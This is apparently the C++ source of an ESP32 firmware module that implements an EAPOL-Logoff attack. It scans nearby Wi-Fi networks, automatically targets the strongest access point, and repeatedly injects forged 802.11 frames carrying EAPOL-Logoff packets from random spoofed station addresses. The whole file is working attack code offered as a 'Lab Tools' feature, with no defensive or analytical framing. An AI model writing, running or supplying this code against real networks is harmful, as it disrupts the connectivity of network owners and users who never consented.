/**
 * @file eapol_logoff.cpp
 * @brief EAPOL logoff attack implementation
 */

#include "eapol_logoff.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

extern "C" {

#define MAX_ATTACK_APS 25

static volatile bool eapol_logoff_running = false;
static volatile uint32_t eapol_logoff_packets_sent = 0;
static TaskHandle_t eapol_logoff_task_handle = NULL;
static uint32_t eapol_attack_delay_ms = 10;

static wifi_ap_record_t selected_ap;
static wifi_ap_record_t attack_aps[MAX_ATTACK_APS];
static int attack_ap_count = 0;

static const uint8_t eapol_logoff_frame_template[36] = {
  0x08, 0x01, 0x00, 0x00,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0x00, 0x00,
  0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
  0x01, 0x02, 0x00, 0x00
};

static void attack_scan_aps(void) {
  attack_ap_count = 0;
  memset(&selected_ap, 0, sizeof(selected_ap));
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  int n = WiFi.scanNetworks(false, true);
  if (n <= 0) {
    WiFi.scanDelete();
    return;
  }
  attack_ap_count = (n > MAX_ATTACK_APS) ? MAX_ATTACK_APS : n;
  int best = 0;
  for (int i = 0; i < attack_ap_count; i++) {
    memcpy(attack_aps[i].bssid, WiFi.BSSID(i), 6);
    attack_aps[i].primary = WiFi.channel(i);
    attack_aps[i].rssi = WiFi.RSSI(i);
    String raw = WiFi.SSID(i);
    strncpy((char *)attack_aps[i].ssid, raw.c_str(), 32);
    attack_aps[i].ssid[32] = '\0';
    if (attack_aps[i].rssi > attack_aps[best].rssi) {
      best = i;
    }
  }
  selected_ap = attack_aps[best];
  WiFi.scanDelete();
}

static void wifi_tx_prepare_ap_mode(void) {
  // Use low-level esp_wifi APIs only; avoid Arduino WiFi.mode()/WiFi.disconnect()
  esp_wifi_disconnect();
  vTaskDelay(pdMS_TO_TICKS(50));
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));

  wifi_config_t ap_config = {};
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(200));
}

static void wifi_tx_restore_sta_mode(void) {
  // Restore STA mode using esp_wifi APIs (avoid Arduino wrappers)
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(100));
}

static void eapol_logoff_task(void *param) {
  (void)param;
  uint8_t frame[sizeof(eapol_logoff_frame_template)];
  TickType_t last_log_tick = xTaskGetTickCount();
  uint32_t last_log_total = 0;

  while (eapol_logoff_running) {
    memcpy(frame, eapol_logoff_frame_template, sizeof(frame));

    if (strlen((const char *)selected_ap.ssid) > 0) {
      uint8_t *ap_bssid = selected_ap.bssid;
      esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);

      uint8_t fake_sta[6];
      esp_fill_random(fake_sta, 6);
      fake_sta[0] &= 0xFE;
      fake_sta[0] |= 0x02;

      memcpy(&frame[4], ap_bssid, 6);
      memcpy(&frame[10], fake_sta, 6);
      memcpy(&frame[16], ap_bssid, 6);

      esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
      eapol_logoff_packets_sent++;
    } else {
      Serial.println("No AP target for eapol logoff");
      eapol_logoff_running = false;
      break;
    }

    TickType_t now = xTaskGetTickCount();
    if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
      uint32_t total = eapol_logoff_packets_sent;
      uint32_t interval = total - last_log_total;
      last_log_total = total;
      last_log_tick = now;
      uint32_t pps = interval / 5;
      Serial.printf("EAPOL-Logoff: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
    }

    vTaskDelay(pdMS_TO_TICKS(eapol_attack_delay_ms));
  }
  eapol_logoff_task_handle = NULL;
  vTaskDelete(NULL);
}

void eapol_logoff_start(void) {
  if (eapol_logoff_running) {
    Serial.println("EAPOL Logoff already running");
    return;
  }

  attack_scan_aps();
  if (strlen((const char *)selected_ap.ssid) == 0) {
    Serial.println("EAPOL Logoff: No AP found — run a WiFi scan first");
    return;
  }

  Serial.println("[EAPOL] start called");
  Serial.println("[EAPOL] calling wifi_tx_prepare_ap_mode");
  wifi_tx_prepare_ap_mode();
  Serial.println("[EAPOL] wifi_tx_prepare_ap_mode done");
  Serial.printf("[EAPOL] EAPOL Logoff targeting %s (ch %d)\n", selected_ap.ssid, selected_ap.primary);

  eapol_logoff_running = true;
  eapol_logoff_packets_sent = 0;
  Serial.println("[EAPOL] creating task");
  BaseType_t attack_rc = xTaskCreate(eapol_logoff_task, "eapol_logoff", 4096, NULL, 5, &eapol_logoff_task_handle);
  Serial.println("[EAPOL] task created");
  if (attack_rc != pdPASS) {
    Serial.printf("EAPOL Logoff failed to start (attack=%ld)\n", (long)attack_rc);
    eapol_logoff_running = false;
    eapol_logoff_task_handle = NULL;
    wifi_tx_restore_sta_mode();
  }
}

void eapol_logoff_stop(void) {
  if (!eapol_logoff_running && eapol_logoff_task_handle == NULL) {
    return;
  }

  eapol_logoff_running = false;
  vTaskDelay(pdMS_TO_TICKS(100));

  if (eapol_logoff_task_handle) {
    TaskHandle_t temp_handle = eapol_logoff_task_handle;
    eapol_logoff_task_handle = NULL;
    vTaskDelete(temp_handle);
  }

  wifi_tx_restore_sta_mode();
  Serial.printf("EAPOL-Logoff stopped. Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
}

void eapol_logoff_display(void) {
  Serial.printf("EAPOL-Logoff: Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
}

void eapol_logoff_help(void) {
  Serial.println("Usage: EAPOL logoff attack via Lab Tools menu");
}

bool eapol_logoff_is_running(void) {
  return eapol_logoff_running;
}

} // extern "C"
